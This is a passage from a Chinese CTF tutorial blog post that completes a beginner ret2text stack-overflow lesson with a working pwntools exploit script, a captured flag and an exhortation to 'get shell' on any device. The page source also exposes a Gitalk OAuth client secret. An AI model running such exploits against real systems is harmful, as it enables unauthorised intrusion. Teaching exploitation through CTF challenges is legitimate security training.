<p>使用pwntools库我们可以很方便地输入相应的payload</p>
<p>接下来我们就该开始构造我们用以get shell的脚本了，利用pwntools库，构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *				<span class="comment"># 从pwntools库中导入所需要的一切</span></span><br><span class="line">p = process(<span class="string">'./test'</span>)			<span class="comment"># 运行一个程序</span></span><br><span class="line">								<span class="comment"># 需要注意的是，在连接远程服务器的时候，使用的是remote()</span></span><br><span class="line">    							<span class="comment"># p = remote(addr,port)</span></span><br><span class="line">        						<span class="comment"># 如：p = remote('sec.arttnba3.cn',10001)</span></span><br><span class="line">p.recv()						<span class="comment"># 从程序中读取输入直到下一个断点（如遇到输入语句）</span></span><br><span class="line">sys_addr = p64(<span class="number">0x400547</span>)		<span class="comment"># 将地址构造为符合小端模式的bytes数组，长度为8</span></span><br><span class="line">								<span class="comment"># 需要注意的是在32位下应当使用p32()，长度为4</span></span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">0x28</span> + sys_addr	<span class="comment"># 构造我们的payload</span></span><br><span class="line">p.sendline(payload)				<span class="comment"># 向程序发送我们的输入</span></span><br><span class="line">								<span class="comment"># 需要注意的是，sendline()会在末尾添加换行符'\n'</span></span><br><span class="line">    							<span class="comment"># 若不想要发送多余的换行符，可以使用send()方法</span></span><br><span class="line">p.interactive()					<span class="comment"># 程序进入interactive模式，即进入我们与程序直接交互的界面</span></span><br></pre></td></tr></table></figure>

<p><strong>成功get shell</strong></p>
<p><img src="https://i.loli.net/2020/09/19/gaKMp2WFLs8coRJ.png" alt="image.png"></p>
<p>至此，我们已经完成了<strong>从0开始利用gets()函数的栈溢出漏洞获取最高权限的整个过程</strong>，接下来就该靠你自己的努力，去分析、利用每一个可以被利用的系统漏洞，夺取最高权限了</p>
<p><strong>为了拥有“能够getshell任意一台设备”的能力而努力吧！新生代的黑客们！</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;PWN_T0_0WN!&#125;</span><br></pre></td></tr></table></figure>
    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" rel="tag"># 信息安全</a>
              <a href="/tags/PWN/" rel="tag"># PWN</a>
              <a href="/tags/python/" rel="tag"># python</a>
              <a href="/tags/CTF/" rel="tag"># CTF</a>
              <a href="/tags/ret2text/" rel="tag"># ret2text</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2020/09/17/%E3%80%90OJ-0x0005-Leetcode%E3%80%91%E6%A0%91%E9%83%A8%E5%88%86write-up-by-arttnba3/" rel="prev" title="【OJ-0x0005-Leetcode】树部分write up by arttnba3">
      <i class="fa fa-chevron-left"></i> 【OJ-0x0005-Leetcode】树部分write up by arttnba3
    </a></div>
      <div class="post-nav-item">
    <a href="/2020/09/19/%E3%80%90CTF%E9%A2%98%E8%A7%A3-0x05%E3%80%91MSSCTF2020-write-up-by-arttnb3-md/" rel="next" title="【CTF题解-0x05】MSSCTF2020-write-up-by-arttnb3">
      【CTF题解-0x05】MSSCTF2020-write-up-by-arttnb3 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          
    <div class="comments" id="gitalk-container"></div>

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Pwn从入门到入狱"><span class="nav-number">1.</span> <span class="nav-text">Pwn从入门到入狱</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#简介：什么是Pwn？"><span class="nav-number">1.1.</span> <span class="nav-text">简介：什么是Pwn？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#预备知识"><span class="nav-number">1.2.</span> <span class="nav-text">预备知识</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pwn的解题过程？"><span class="nav-number">1.3.</span> <span class="nav-text">Pwn的解题过程？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0基础入门：新人的第一个安全漏洞的利用——栈溢出——ret2text"><span class="nav-number">1.4.</span> <span class="nav-text">0基础入门：新人的第一个安全漏洞的利用——栈溢出——ret2text</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#前置知识要求："><span class="nav-number">1.4.0.1.</span> <span class="nav-text">前置知识要求：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#前置环境要求："><span class="nav-number">1.4.0.2.</span> <span class="nav-text">前置环境要求：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#百度“Linux-换源”与“pip-换源”更换Linux下的软件源为国内的软件源，提高下载速度"><span class="nav-number">1.4.0.3.</span> <span class="nav-text">百度“Linux 换源”与“pip 换源”更换Linux下的软件源为国内的软件源，提高下载速度</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#不同的Linux发行版本（如Ubuntu、Kali、manjaro等）请自行将搜索框内的“linux”换为对应的发行版名称"><span class="nav-number">1.4.0.4.</span> <span class="nav-text">不同的Linux发行版本（如Ubuntu、Kali、manjaro等）请自行将搜索框内的“linux”换为对应的发行版名称</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#以下内容操作环境位于Linux："><span class="nav-number">1.4.1.</span> <span class="nav-text">以下内容操作环境位于Linux：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#安全检查：checksec"><span class="nav-number">1.4.1.1.</span> <span class="nav-text">安全检查：checksec</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#逻辑分析"><span class="nav-number">1.4.1.2.</span> <span class="nav-text">逻辑分析</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#以下内容操作环境位于Windows："><span class="nav-number">1.4.2.</span> <span class="nav-text">以下内容操作环境位于Windows：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#IDA：逆向分析"><span class="nav-number">1.4.2.1.</span> <span class="nav-text">IDA：逆向分析</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#F5键：使用IDA进行逆向分析的神器"><span class="nav-number">1.4.3.</span> <span class="nav-text">F5键：使用IDA进行逆向分析的神器</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#以下内容操作环境位于Linux：-1"><span class="nav-number">1.4.4.</span> <span class="nav-text">以下内容操作环境位于Linux：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#栈帧"><span class="nav-number">1.4.4.1.</span> <span class="nav-text">栈帧</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#攻击神器：pwntools"><span class="nav-number">1.4.4.2.</span> <span class="nav-text">攻击神器：pwntools</span></a></li></ol></li></ol></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="arttnba3"
      src="/images/avatar.png">
  <p class="site-author-name" itemprop="name">arttnba3</p>
  <div class="site-description" itemprop="description">- 做了关于你的梦，所以不愿醒来呢 -</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">21</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">5</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">45</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/arttnba3" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;arttnba3" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:1543127579@qq.com" title="E-Mail → mailto:1543127579@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://weibo.com/u/7518681149" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;u&#x2F;7518681149" rel="noopener" target="_blank"><i class="fab fa-weibo fa-fw"></i>Weibo</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://twitter.com/arttnba3" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;arttnba3" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
      </span>
  </div>


  <div class="links-of-blogroll motion-element">
    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
      Friends' Links
    </div>
    <ul class="links-of-blogroll-list">
        <li class="links-of-blogroll-item">
          <a href="https://www.wootec.top/" title="https:&#x2F;&#x2F;www.wootec.top" rel="noopener" target="_blank">Reverier</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://luoq1an.github.io/" title="https:&#x2F;&#x2F;luoq1an.github.io" rel="noopener" target="_blank">luoqian</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://ll1ng.github.io/" title="https:&#x2F;&#x2F;ll1ng.github.io" rel="noopener" target="_blank">ling</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://shal10w.github.io/" title="https:&#x2F;&#x2F;shal10w.github.io" rel="noopener" target="_blank">shallow</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://eqqie.cn/" title="https:&#x2F;&#x2F;eqqie.cn" rel="noopener" target="_blank">eqqie</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://cor1e.cn/" title="https:&#x2F;&#x2F;cor1e.cn" rel="noopener" target="_blank">cor1e</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://yunq1ao.com/" title="https:&#x2F;&#x2F;yunq1ao.com" rel="noopener" target="_blank">yunqiao</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://mercer5.github.io/" title="https:&#x2F;&#x2F;mercer5.github.io" rel="noopener" target="_blank">mercer</a>
        </li>
    </ul>
  </div>

      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">arttnba3</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  
  <script>
    (function(){
      var canonicalURL, curProtocol;
      //Get the <link> tag
      var x=document.getElementsByTagName("link");
		//Find the last canonical URL
		if(x.length > 0){
			for (i=0;i<x.length;i++){
				if(x[i].rel.toLowerCase() == 'canonical' && x[i].href){
					canonicalURL=x[i].href;
				}
			}
		}
    //Get protocol
	    if (!canonicalURL){
	    	curProtocol = window.location.protocol.split(':')[0];
	    }
	    else{
	    	curProtocol = canonicalURL.split(':')[0];
	    }
      //Get current URL if the canonical URL does not exist
	    if (!canonicalURL) canonicalURL = window.location.href;
	    //Assign script content. Replace current URL with the canonical URL
      !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=canonicalURL,t=document.referrer;if(!e.test(r)){var n=(String(curProtocol).toLowerCase() === 'https')?"https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif":"//api.share.baidu.com/s.gif";t?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var i=new Image;i.src=n}}(window);})();
  </script>















  

  

<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">

<script>
NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
    var gitalk = new Gitalk({
      clientID    : 'a040036b8e5ab6a9838d',
      clientSecret: '7b9006697fe7a78e56f22a025caf2deb03e14ea8',
      repo        : 'BlogComment',
      owner       : 'SakuraiHimeki',
      admin       : ['SakuraiHimeki'],
      id          : 'e2ae9c4527bcd706c158f54e3fa3a673',
        language: '',
      distractionFreeMode: false
    });
    gitalk.render('gitalk-container');
  }, window.Gitalk);
});
</script>

</body>
</html>
